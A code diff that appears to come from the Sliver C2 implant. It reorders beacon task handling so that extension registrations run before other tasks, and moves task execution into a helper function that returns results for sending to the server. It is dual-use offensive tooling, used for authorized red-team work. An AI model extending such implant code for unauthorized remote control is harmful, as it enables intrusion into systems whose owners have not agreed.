@@ -394,13 +394,50 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 		return nil
 	}
 
+	var tasksExtensionRegister []*sliverpb.Envelope
+	var tasksOther []*sliverpb.Envelope
+
+	for _, task := range tasks.Tasks {
+		switch task.Type {
+		case sliverpb.MsgRegisterExtensionReq:
+			tasksExtensionRegister = append(tasksExtensionRegister, task)
+		default:
+			tasksOther = append(tasksOther, task)
+		}
+	}
+
+	// ensure extensions are registered before they are called
+	var results []*sliverpb.Envelope
+	for _, r := range beaconHandleTasklist(tasksExtensionRegister) {
+		results = append(results, r)
+	}
+	for _, r := range beaconHandleTasklist(tasksOther) {
+		results = append(results, r)
+	}
+
+	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
+		ID:    InstanceID,
+		Tasks: results,
+	}))
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[beacon] error sending results %s", err)
+		// {{end}}
+	}
+	// {{if .Config.Debug}}
+	log.Printf("[beacon] all results sent to server, cleanup ...")
+	// {{end}}
+	return nil
+}
+
+func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 	results := []*sliverpb.Envelope{}
 	resultsMutex := &sync.Mutex{}
 	wg := &sync.WaitGroup{}
 	sysHandlers := handlers.GetSystemHandlers()
 	specHandlers := handlers.GetSpecialHandlers()
 
-	for _, task := range tasks.Tasks {
+	for _, task := range tasks {
 		// {{if .Config.Debug}}
 		log.Printf("[beacon] execute task %d", task.Type)
 		// {{end}}
@@ -409,37 +446,41 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 			data := task.Data
 			taskID := task.ID
 			// {{if eq .Config.GOOS "windows" }}
-			go handlers.WrapperHandler(handler, data, func(data []byte, err error) {
-				resultsMutex.Lock()
-				defer resultsMutex.Unlock()
+			go func() {
 				defer wg.Done()
-				// {{if .Config.Debug}}
-				if err != nil {
-					log.Printf("[beacon] handler function returned an error: %s", err)
-				}
-				log.Printf("[beacon] task completed (id: %d)", taskID)
-				// {{end}}
-				results = append(results, &sliverpb.Envelope{
-					ID:   taskID,
-					Data: data,
+				handlers.WrapperHandler(handler, data, func(data []byte, err error) {
+					resultsMutex.Lock()
+					defer resultsMutex.Unlock()
+					// {{if .Config.Debug}}
+					if err != nil {
+						log.Printf("[beacon] handler function returned an error: %s", err)
+					}
+					log.Printf("[beacon] task completed (id: %d)", taskID)
+					// {{end}}
+					results = append(results, &sliverpb.Envelope{
+						ID:   taskID,
+						Data: data,
+					})
 				})
-			})
+			}()
 			//  {{else}}
-			go handler(data, func(data []byte, err error) {
-				resultsMutex.Lock()
-				defer resultsMutex.Unlock()
+			go func() {
 				defer wg.Done()
-				// {{if .Config.Debug}}
-				if err != nil {
-					log.Printf("[beacon] handler function returned an error: %s", err)
-				}
-				log.Printf("[beacon] task completed (id: %d)", taskID)
-				// {{end}}
-				results = append(results, &sliverpb.Envelope{
-					ID:   taskID,
-					Data: data,
+				handler(data, func(data []byte, err error) {
+					resultsMutex.Lock()
+					defer resultsMutex.Unlock()
+					// {{if .Config.Debug}}
+					if err != nil {
+						log.Printf("[beacon] handler function returned an error: %s", err)
+					}
+					log.Printf("[beacon] task completed (id: %d)", taskID)
+					// {{end}}
+					results = append(results, &sliverpb.Envelope{
+						ID:   taskID,
+						Data: data,
+					})
 				})
-			})
+			}()
 			// {{end}}
 		} else if task.Type == sliverpb.MsgOpenSession {
 			go openSessionHandler(task.Data)
@@ -461,6 +502,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 			resultsMutex.Unlock()
 		}
 	}
+
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] waiting for task(s) to complete ...")
 	// {{end}}
@@ -469,19 +511,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	log.Printf("[beacon] all tasks completed, sending results to server")
 	// {{end}}
 
-	err = beacon.Send(wrapEnvelope(sliverpb.MsgBeaconTasks, &sliverpb.BeaconTasks{
-		ID:    InstanceID,
-		Tasks: results,
-	}))
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[beacon] error sending results %s", err)
-		// {{end}}
-	}
-	// {{if .Config.Debug}}
-	log.Printf("[beacon] all results sent to server, cleanup ...")
-	// {{end}}
-	return nil
+	return results
 }
 
 func openSessionHandler(data []byte) {
